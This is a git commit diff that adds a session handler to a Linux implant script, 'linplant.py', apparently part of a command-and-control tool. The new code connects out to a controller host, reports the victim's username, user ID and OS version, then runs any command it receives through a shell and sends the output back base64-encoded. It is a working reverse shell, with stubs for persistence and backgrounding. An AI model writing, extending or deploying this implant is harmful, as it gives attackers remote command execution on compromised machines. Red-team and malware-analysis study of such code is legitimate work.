6e0961eb19f28f3b088b414a3ebeaf8efdf3055d
Matu Kahsay <108632333+matu-kahsay@users.noreply.github.com>
2024-02-27 11:41:53 -0800

    Implement session handling for remote command execution

--- linplant.py
+++ linplant.py
@@ -22,3 +22,40 @@ def outbound(message):
     response = str(message)
     response = base64.b64encode(bytes(response, encoding='utf8'))
     sock.send(response)
+
+
+def session_handler():
+    try:
+        sock.connect((host_ip, host_port))
+        outbound(pwd.getpwuid(os.getuid())[0])
+        outbound(os.getuid())
+        time.sleep(1)
+        op_sys = platform.uname()
+        op_sys = (f'{op_sys[0]} {op_sys[2]}')
+        outbound(op_sys)
+        while True:
+            message = inbound()
+            if message == 'exit':
+                sock.close()
+                break
+            elif message == 'persist':
+                pass
+            elif message.split(" ")[0] == 'cd':
+                try:
+                    directory = str(message.split(" ")[1])
+                    os.chdir(directory)
+                    cur_dir = os.getcwd()
+                    outbound(cur_dir)
+                except FileNotFoundError:
+                    outbound('Invalid directory. Try again.')
+                    continue
+            elif message == 'background':
+                pass
+            elif message == 'help':
+                pass
+            else:
+                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output = command.stdout.read() + command.stderr.read()
+                outbound(output.decode())
+    except ConnectionRefusedError:
+        pass
